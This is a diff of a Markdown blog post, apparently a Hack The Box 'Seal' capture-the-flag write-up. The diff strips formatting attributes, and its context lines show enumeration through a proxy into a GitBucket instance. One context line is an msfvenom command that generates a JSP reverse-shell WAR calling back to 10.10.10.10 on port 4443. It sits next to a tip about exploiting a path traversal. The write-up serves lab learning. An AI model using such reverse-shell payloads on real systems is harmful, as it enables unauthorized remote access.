@@ -14,12 +14,11 @@ header:
 
 Hello guys!
 
-This week's machine will be **Seal**, another medium-rated Linux box from [Hack The Box](https://www.hackthebox.eu/), created by [MrR3boot](https://app.hackthebox.eu/users/13531)<!--more-->
+This week's machine will be **Seal**, another medium-rated Linux box from [Hack The Box](https://www.hackthebox.eu/), created by [MrR3boot](https://app.hackthebox.eu/users/13531) [more]
 
-:information_source: **Info**: Write-ups for Hack The Box machines are posted as soon as they’re retired.
-{: .notice--info}
+:information_source: **Info**: Write-ups for Hack The Box machines are posted as soon as they're retired.
 
-![HTB Seal](https://i.imgur.com/meex9Q8.png){: .align-center}
+![HTB Seal](https://i.imgur.com/meex9Q8.png)
 
 add **Comment**
 
@@ -143,7 +142,7 @@ As observed in the `nmap` scan, port 443/TCP runs an HTTPS service with a certif
 
 Accessing the website, we notice a vegetable shop website in a single page application, as below
 
-![HTB Seal - HTTPS Website](https://i.imgur.com/y5wtEp3.png){: .align-center}
+![HTB Seal - HTTPS Website](https://i.imgur.com/y5wtEp3.png)
 
 Inspecting the references using `curl` we can't see anything useful as well.
 
@@ -247,11 +246,11 @@ Probably these URLs are being filtered from unknown IPs, where we should find a 
 
 According to `nmap` scan, we have a proxy service running in this TCP port. A quick way to confirm that is to set it as my proxy server, which I've added to Burp Suite so I could keep inspecting the requests made to the server.
 
-![HTB Seal - Burp Upstream Proxy configuration](https://i.imgur.com/Wkk3t0F.png){: .align-center}
+![HTB Seal - Burp Upstream Proxy configuration](https://i.imgur.com/Wkk3t0F.png)
 
 While entering the website address to reach out to it using the proxy, by mistake, I have entered the URL missing the HTTPS protocol and surprisingly found a website running in 80/TCP in the host, not available publicly, running a **GitBucket** instance. This confirms that the proxy service is running and will allow us to enumerate the service running locally
 
-![HTB Seal - HTTP Service via Proxy](https://i.imgur.com/evXIne6.png){: .align-center}
+![HTB Seal - HTTP Service via Proxy](https://i.imgur.com/evXIne6.png)
 
 ### 80/TCP - HTTP Service
 
@@ -308,11 +307,11 @@ http://seal.htb/signin [200 OK] Bootstrap, Cookies[JSESSIONID], Country[RESERVED
 
 As nothing interesting was found, decided to attempt to create an account, where the following information was used, including adding a URL point to ourselves, in the case of receiving a request
 
-![HTB Seal - GitBucket account creation](https://i.imgur.com/NsME1ay.png){: .align-center}
+![HTB Seal - GitBucket account creation](https://i.imgur.com/NsME1ay.png)
 
 With the newly created account, started browsing the existing repositories in this server, where found the repositories **Infra** and "**seal_market**", owned by **root**. Also seen, from the dashboard, we can see users `luis` and `alex` commenting on some issues in these repositories
 
-![HTB Seal - GitBucket server news feed](https://i.imgur.com/rYwpG13.png){: .align-center}
+![HTB Seal - GitBucket server news feed](https://i.imgur.com/rYwpG13.png)
 
 Started by inspecting the contents of both repositories, which were cloned to my attacker machine. Important to note that as we're accessing it through a proxy server, we need to add first a configuration to use a proxy server when accessing repositories in the seal.htb domain
 
@@ -404,7 +403,7 @@ msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.10.10 LPORT=4443 -f war > rev
 ```
 
 :bulb: **Tip**: One important point here is that I needed to intercept all page requests so I could adjust the post request to the path traversal vulnerability found
-{: .notice--info}
+
 
 ## User flag
 
